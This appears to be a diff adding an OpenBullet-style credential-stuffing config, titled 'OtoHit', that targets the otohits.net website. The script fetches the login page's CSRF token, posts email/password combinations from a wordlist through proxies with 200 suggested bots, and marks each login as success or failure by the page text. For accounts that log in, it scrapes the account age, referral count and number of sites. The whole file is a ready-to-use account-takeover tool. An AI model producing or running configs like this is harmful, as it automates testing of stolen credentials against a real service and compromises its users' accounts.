@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "OtoHit",
+  "SuggestedBots": 200,
+  "LastModified": "2019-04-11T21:20:14.4214928+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "EmailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.otohits.net/account/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.otohits.net" 
+  HEADER "Referer: https://www.otohits.net/account/login" 
+PARSE "<SOURCE>" LR "value=\"" "\" />" -> VAR "KEY" 
+REQUEST POST " https://www.otohits.net/account/login" 
+  CONTENT "__RequestVerificationToken=<KEY>&ReturnUrl=&Email=<USER>&Password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "action=\"/account/logout\"" 
+  KEYCHAIN Failure OR 
+    KEY "<li>Compte introuvable (mauvais email ou mot de passe)</li>" 
+REQUEST GET "https://www.otohits.net/account/dashboard" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" CSS "body > div.content > div.container-fluid > div > div:nth-child(2) > div:nth-child(1) > div > ul > li:nth-child(1) > span" "innerHTML" -> CAP "Anciennete" 
+PARSE "<SOURCE>" CSS "body > div.content > div.container-fluid > div > div:nth-child(2) > div:nth-child(1) > div > ul > li:nth-child(5) > a > span" "innerHTML" -> CAP "filleul" 
+REQUEST GET "https://www.otohits.net/account/mysites" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" CSS "body > div.content > div.container-fluid > div.row-fluid > div:nth-child(2) > div:nth-child(3) > div > p" "innerHTML" -> CAP "Nombre de site" 
